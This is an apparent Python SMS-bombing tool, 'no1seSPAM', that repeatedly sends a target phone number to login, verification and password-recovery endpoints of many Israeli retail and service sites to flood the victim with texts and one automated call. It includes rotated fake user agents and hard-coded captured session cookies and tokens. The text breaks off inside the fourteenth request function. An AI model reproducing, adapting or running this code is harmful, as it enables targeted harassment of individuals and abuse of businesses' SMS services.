#Coded and made by no1se in 4 days not the full 24 hours tho. I think I've overdosed from requests, for real. Thanks to my friend, whom I can't name because the feds are all over him, for finding the last 12 websites.
import requests
import os
import platform
import time
from colorama import Fore, Back, Style, init
from fake_useragent import UserAgent




# art
art = """
        ██████  ██████  ██████  ███████ ██████      ██████  ██    ██     ███    ██  ██████   ██ ███████ ███████ 
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██  ██  ██      ████   ██ ██    ██ ███ ██      ██      
        ██      ██    ██ ██   ██ █████   ██   ██     ██████    ████       ██ ██  ██ ██    ██  ██ ███████ █████   
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██    ██        ██  ██ ██ ██    ██  ██      ██ ██      
        ██████  ██████  ██████  ███████ ██████      ██████     ██        ██   ████  ██████   ██ ███████ ███████ 
                                                1.0                                                                 
"""

art2 = """
        ██████╗ ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ██╗ ██████╗  ██╗███████╗███████╗
        ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗  ██║██╔═══██╗███║██╔════╝██╔════╝
        ██║     ██║   ██║██║  ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔██╗ ██║██║   ██║╚██║███████╗█████╗  
        ██║     ██║   ██║██║  ██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╗██║██║   ██║ ██║╚════██║██╔══╝  
        ╚██████╗╚██████╔╝██████╔╝███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚████║╚██████╔╝ ██║███████║███████╗
        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═══╝ ╚═════╝  ╚═╝╚══════╝╚══════╝
                                                2.0
"""


# Clear function like always
def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")




#My Amazing intro
def intro():
    clear()
    print(Fore.RED + art)
    time.sleep(0.5)
    clear()
    print(Fore.BLUE + art2)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTCYAN_EX + art)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTMAGENTA_EX + art2)    

ua = UserAgent()


def main_menu():
    while True:
        #Squidward
        clear()
        print("        .--'''''''''--.")
        print("     .'      .---.      '.")
        print("    /    .-----------.    \'")
        print("   /        .-----.        \'")
        print("   |       .-.   .-.       |")
        print("   |      /   \ /   \      |")
        print("    \    | .-. | .-. |    /")
        print("     '-._| | | | | | |_.-'")
        print("         | '-' | '-' |")
        print("          \___/ \___/")
        print("       _.-'  /   \  `-._")
        print("     .' _.--|     |--._ '.")
        print("     ' _...-|     |-..._ '")
        print("            |     |")
        print("            '.___.'")
        #Squidward
        print(Fore.RED+"Welcome to no1seSPAM - Spam your enemy.")
        print(Fore.LIGHTYELLOW_EX+"Please select an option:")
        print(f"{Fore.WHITE}1. Begin attacking a phone number.{Style.RESET_ALL}")
        print(f"{Fore.WHITE}2. Exit{Style.RESET_ALL}")
        choice = input(f"{Fore.LIGHTBLUE_EX}Enter your choice:{Fore.WHITE} ")

        if choice == "1":
            clear()
            print(f"{Fore.GREEN}Example: 0528371496")
            phone_num = input(f"{Fore.LIGHTYELLOW_EX}Type the phone number you want to attack: ")
            try:
                count = 0
                print(f"{Fore.RED}Press ctrl+c to stop the attack.")
                while True:
                    request1(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request2(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request3(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request4(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request5(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request6(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request7(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')


                    time.sleep(1)
                    request8(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request9(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    phone_call_request10(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request11(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')


                    time.sleep(1)
                    request12(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')


                    time.sleep(1)
                    request13(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')


                    time.sleep(1)
                    request14(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')


                    time.sleep(1)
                    request15(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')


                    time.sleep(1)
                    request16(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request17(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request18(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request19(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request20(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request21(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request22(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')
                    
            except KeyboardInterrupt:
                print(f"{Fore.RED}Attack stopped.")
                time.sleep(2)
                main_menu()
            exit(1)

        elif choice == "2":
            print(f"{Fore.LIGHTYELLOW_EX}Bye! :(")
            exit(1)
        else:
            print("")
            print(f"{Fore.RED}Please select a valid option!")
            time.sleep(2)



def request1(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = "https://www.braha.co.il/frontend/check_phone"
    headers = {
        #I used VPN Dawg. Cookies are essential, specifically in this request.
        "Cookie": "promo_modal=eyJpdiI6InVIRXl0a2FoOXVuU0RoMkpscFpCZlE9PSIsInZhbHVlIjoiUlRNV3RXLzk1dGlmUExRdldsOTBEOGtjMUd6TElPMFpDdnpmeDdOdGtHenZOazhIM1luYnR3RU12NWRNVExtMiIsIm1hYyI6ImZjYjQ3MzQ2MjI2MmY0OGJjODdkMzVkY2I4MGVhNzM3MmYzNWI0MTZhZTM4NzQ1MTAxNzVhZTVhMjllODgyYjIifQ%3D%3D; laravel_session=riVLVGZKEo1LoGllxvZJLbn9tZRpPlkuVOlzu8H6; _ga=GA1.1.492940928.1710097695; _fbp=fb.2.1710097695397.196197340; _ga_0JWTB406JX=GS1.1.1710097695.1.0.1710097711.44.0.0; XSRF-TOKEN=eyJpdiI6IkRyTjhySWVZTTlVS29kVEhSNWlOenc9PSIsInZhbHVlIjoic0FtVjZOd01YSEc5cVJ2bEltS1d3VDAxRmJNaTVISlJVdTBta0RLQ2ZoYkRFZ3hxWVZ6QU55MjI3dm9PcW1qdlY1K21zajljWm12VklPSEEwcU5XOWNhYm1yRGRRMVdNUm9SeUlraDlTa0k4QjdaWjFtRlNHMC9wQmZNWFhmdmwiLCJtYWMiOiJiZTBhZTY2MzA0ODJjMDQ0MmI5ZDQ1NDFkOTQyNmVlZTU1MzM2N2FjNTM4MmRhYzg4MWViOTk4ZDE4ZGRiYWYzIn0%3D",
        "Content-Length": "104",
        "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": random_BigBootyLatina,
        "Sec-Ch-Ua-Platform": "\"Linux\"",
        "Origin": "https://www.braha.co.il",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.braha.co.il/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }

    data = {
        "login_message_type": "sms",
        "extension": f"{extension}",
        "phone_number": f"{after_phone}",
        "_token": "em2FD5StfArjjJFagRUmUINJ3FKcp018pgYVtcOR"
    }

    response = requests.post(url, headers=headers, data=data)

def request2(phone_num):
    random_BigBootyLatina = ua.random
    url = 'https://trusty.co.il/api/auth/ask-for-auth-code'
    #removed the cookie because it was leaking the IP address (CSRF token).
    headers = {
        'Host': 'trusty.co.il',
        'Content-Length': '63',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://trusty.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://trusty.co.il/login',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'phone': f'{phone_num}',
        'email': '',
        'process_name': 'normal_login'
    }

    response = requests.post(url, json=payload, headers=headers)


def request3(phone_num):
    random_BigBootyLatina = ua.random
    url = 'https://server.myofer.co.il/api/sendAuthSms'
    headers = {
        'Content-Length': '28',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Appplatform': 'website',
        'Referrer': '',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://myofer.co.il',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'phoneNumber': f'{phone_num}'
    }

    response = requests.post(url, data=payload, headers=headers)


def request4(phone_num):
    #removed a lot of unnecessary stuff that was there.
    random_BigBootyLatina = ua.random
    url = 'https://friends.smarticket.co.il/iframe/api/customer/forgot_password'
    headers = {
        'Content-Length': '168',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://friends.smarticket.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://friends.smarticket.co.il/iframe/login?ref=/iframe/account/profile',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'recovery_type': 'sms',
        'cellphone': f'{phone_num}',
        'temporary_password': ''
    }

    response = requests.post(url, data=payload, headers=headers)

def request5(phone_num):
    random_BigBootyLatina = ua.random
    url = 'https://www.olsale.co.il/login/by-sms'
    headers = {
        'Content-Length': '69',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.olsale.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.olsale.co.il/login?ref=/profile',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'id': '',
        'phonenumber': f'{phone_num}',
        'digits': '',
        'status': 'send-code'
    }

    response = requests.post(url, json=payload, headers=headers)


def request6(phone_num):
    url = 'https://www.matnasata.org.il/page.php?type=logUser&ht=%D7%94%D7%AA%D7%97%D7%91%D7%A8%D7%95%D7%AA%20%D7%9C%D7%9E%D7%A2%D7%A8%D7%9B%D7%AA'
    random_BigBootyLatina = ua.random
    headers = {
        'Host': 'www.matnasata.org.il',
        'Content-Length': '92',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://www.matnasata.org.il',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': random_BigBootyLatina,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://www.matnasata.org.il/page.php?type=logUser&ht=%D7%94%D7%AA%D7%97%D7%91%D7%A8%D7%95%D7%AA%20%D7%9C%D7%9E%D7%A2%D7%A8%D7%9B%D7%AA',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=0, i'
    }

    payload = {
        'logPhone': f"{phone_num}",
        'send': '%D7%9B%D7%A0%D7%99%D7%A1%D7%94+%D7%9C%D7%9E%D7%A2%D7%A8%D7%9B%D7%AA'
    }

    response = requests.post(url, headers=headers, data=payload)

def request7(phone_num):
    url = 'https://www.azrielimalls.co.il/website_api/'
    random_BigBootyLatina = ua.random
    headers = {
        'Host': 'www.azrielimalls.co.il',
        'Content-Length': '60',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.azrielimalls.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.azrielimalls.co.il/%D7%94%D7%AA%D7%97%D7%91%D7%A8%D7%95%D7%AA',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'cellphone': f'{phone_num}',
        'action': '7dca3eaec010dd7ededa32cd00f121de'
    }

    response = requests.post(url, headers=headers, data=data)

def request8(phone_num):
    url = 'https://api.noyhasade.co.il/api/login?origin=web'
    random_BigBootyLatina = ua.random
    headers = {
        'Host': 'api.noyhasade.co.il',
        'Content-Length': '36',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://noyhasade.co.il',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://noyhasade.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i',
        'Connection': 'close'
    }

    payload = {
        'phone': f'{phone_num}',
        'email': False
    }

    response = requests.post(url, headers=headers, json=payload)

def request9(phone_num):
    url = 'https://www.naamanp.co.il/customer/ajax/post/'
    random_BigBootyLatina = ua.random
    headers = {
        'Host': 'www.naamanp.co.il',
        'Content-Length': '113',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.naamanp.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.naamanp.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'form_key': 'bvcr5Xu2YXGD3GM1',
        'bot_validation': '1',
        'type': 'login',
        'telephone': f'{phone_num}',
        'code': '',
        'compare_email': '',
        'compare_identity': ''
    }

    response = requests.post(url, headers=headers, data=payload)

def phone_call_request10(phone_num):
    url = "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=c049beda-2a99-442c-afa9-db86ea140940&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54"
    random_BigBootyLatina = ua.random
    payload = {
        "phoneNumber": f"{phone_num}",
        "sourceFrom": "AuthJS",
        "isCalling": True,
        "sessionID": "f5d208a1-e5d0-83d0-157e-3e9968d44538"
    }

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "User-Agent": random_BigBootyLatina,
        "Origin": "https://www.mishloha.co.il",
        "Referer": "https://www.mishloha.co.il/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": '"Chromium";v="119", "Not?A_Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Linux"',
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Priority": "u=1, i"
    }

    response = requests.post(url, json=payload, headers=headers)

def request11(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.floroz.co.il/frontend/check_phone'
    headers = {
        'Host': 'www.floroz.co.il',
        'Cookie': 'laravel_session=drxHBA0jpbCvaiZPs10Aldc69hvuZoDH7VIyK9y0; _gid=GA1.3.991807278.1710674584; _gat_gtag_UA_35628371_1=1; _fbp=fb.2.1710674583798.661978316; _ga_QLYMD46RDB=GS1.1.1710674583.1.1.1710674613.30.0.0; _ga=GA1.1.2045801506.1710674584; XSRF-TOKEN=eyJpdiI6IjFuTkhmeVJNbDgvNDVTM08zcHZxN1E9PSIsInZhbHVlIjoic3RjbS9aTS82UWIzWTczcDRTZFVQZVdkaE40RFlyc2c0SG9hUGVtSW52cnRHWGZPaE1xbjJ3MzJCam9kMHdhVDV2cnpkZE9CT2pqdkxRV1NnYVcrWEwxU1NRRG5tNmV3dktDZWJ2QkRWbEtiSWhuczZzY2pmdE5FM2dXTmpDYSsiLCJtYWMiOiIyOGVhY2ZiMmU1NjBmMjIyMmNiZjgzODBmYmM5ZDRiNDQ0ZmM2YjU1MWY2ODE2ZWNiZWYzYjY1YWYwMWU4NGUxIn0%3D',
        'Content-Length': '104',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.floroz.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.floroz.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': 'XqbePo5gWcdmNyqXKwuNVhDCUyC2LY7YW3cOQAMU'
    }

    response = requests.post(url, headers=headers, data=data)

def request12(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.zvikafruits.co.il/frontend/check_phone'
    headers = {
        'Host': 'www.zvikafruits.co.il',
        'Cookie': 'laravel_session=SFk7fXqcnWZ7tNUxIVXSzVThDRuOqcaopTdTPcKO; _ga=GA1.3.989371058.1710675093; _gid=GA1.3.1485761781.1710675093; _fbp=fb.2.1710675092711.853402339; extension_id=eyJpdiI6Inc5dXJLWGZDWktqck4vM2RFSEw1NlE9PSIsInZhbHVlIjoiMnVqa1JtbjRBaklYU3oxUi9iVVFTdElNMmQ3QjRZY1pTODFPSG55b1NDblU2NmpZQmEzYXJDajRDSlBDYjlTbSIsIm1hYyI6IjA2MzA3Yjc3NGZjNjM3YzkwNmQzYjg3NTc3MTEzOGFiZmFiOWMxNWYwODZiMDA2ZWJmYWU5ZjIzYTllYmRiNDEifQ%3D%3D; extension_code=eyJpdiI6IlBHbkFCM29NTS8rN0JyVWlQeS9oRWc9PSIsInZhbHVlIjoiZ2NMSy9Vc0VWYVJWL0RrUVJ1aFoyU2FvVFd2dGtyZk5KWFNPQmFpdkd3dEhDMlUyZlFSKzd5aFl4WVpmWnVrUSIsIm1hYyI6IjVkNTQ5OWI1ZmJiODQxMTM0ZTMzYjVjMzJmZjlmNjgyZjZiMDc2ZmZiZTQ4MTBmMjhlODZkNjZmZWY3NTEyNDAifQ%3D%3D; phone_number=eyJpdiI6ImJnYnA1eW4ybmlZamN0cGxySm91NFE9PSIsInZhbHVlIjoiQWczOEJtdGhvWUR3TVdVYWZwWXVBcTJUR0FyZ1pZQVRWdGhNQWdDS1BQWk9GK3c3U0J3SkZDRWIxb1Y0Y2ZaL0FqTXdXemhiZWk0ekhmZGViaVY4bEE9PSIsIm1hYyI6ImJkOTBjY2U3N2JhZTViMDBiZTE5MWEzMjEyOWJkNjU5MTkzNmRjOTJhMjI0Y2NhNGU4NmM3OWM0OTc5MjVlYWMifQ%3D%3D; XSRF-TOKEN=eyJpdiI6ImJGUTNSWG9Mc2dQRElQR2JrVHdNQkE9PSIsInZhbHVlIjoiYS84STdYMXpLU1hMUUZWTmN2K0tpd0xDVjI4WHpSMytzQmVzbzZtMjBLOCtGWEZxcTZ3b3NqalJ5cDh3d0N6aFB6UkFmYmNVRmx1MjhFcGNnNnhRb2M4YTJqWXRsZEs5bHI5VEE1S3RQdm1MME5ydEx1dDhnUGhUTldPenpUcXEiLCJtYWMiOiI2YWY0OTZiMzNiODJjNTZhNjAxMmU4M2M5YzRlNWIwMTk4OTI1MTBiMTQ5NmE5NDcyYjFlZmExNWI0NzU0MjljIn0%3D',
        'Content-Length': '104',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.zvikafruits.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.zvikafruits.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': '01DX8ntyVGcRMzllZJRp4DhwQLKiKhq4rkVsL826'
    }

    response = requests.post(url, headers=headers, data=data)

def request13(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = 'https://www.shemeshfruits.co.il/frontend/check_phone'
    headers = {
        'Host': 'www.shemeshfruits.co.il',
        'Cookie': 'promo_modal=eyJpdiI6IjhDVlZHSHpwVzVuSG5FRmNIaHhBYVE9PSIsInZhbHVlIjoiL0FLQmVPRVk1ekFTckJ3dG5HRlVHdXJmVjhTUXRDM3dkSVllNyt3YllEUGMxd3lCTmlIYzVwV3lDcG52VlVEUSIsIm1hYyI6IjZiODNmMTQ1ZDE1ZDk4NmUwMzc4MGVjMmRlNDJlMjVmNmIxNzUwZDYyYTQwMmM4M2FjMmE0ZWFjODkzNjhlZDgifQ%3D%3D; laravel_session=yZPyq65elar0mva9RLsN3QqhucN7uQ8DRtNk7nuK; _gcl_au=1.1.1948381485.1710675549; _ga=GA1.3.1648592344.1710675549; _gid=GA1.3.569473054.1710675549; _fbp=fb.2.1710675549239.316686270; XSRF-TOKEN=eyJpdiI6IkpRNFZ2UDdRS2dBZWp1akQ3SjROWVE9PSIsInZhbHVlIjoiS1BqbHBIRjZoRUVxWWNTNWp1ajAyOE0zeXBIVnNSbDZPTXZ1c0p3TVRvdENNb0NxTHd6QmZRMktQaDZrVXBFQlFtNXpIWXRyQk9YZWNFZzhza0w1enJTZktSdXFiZTVFdnU2WTdyYnNtdVZqd1FRRGV6SFc1SmFiRGNsY0R0bEwiLCJtYWMiOiI2OTc2ZTY2ZDNmMTc2NGFkZTA3YTEwZmY4MmJmZGVmOGRmYThkY2Y3YjI5MjJhMWQ2MGE1MDBiY2YwYzMyMDIxIn0%3D',
        'Content-Length': '104',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': random_BigBootyLatina,
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.shemeshfruits.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.shemeshfruits.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'login_message_type': 'sms',
        'extension': f'{extension}',
        'phone_number': f'{after_phone}',
        '_token': 'ClOEmjB2tFjHXFbCvROqPDUNgwIwwBhLsVG2ts3h'
    }

    response = requests.post(url, headers=headers, data=data)

def request14(phone_num):
    random_BigBootyLatina = ua.random
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
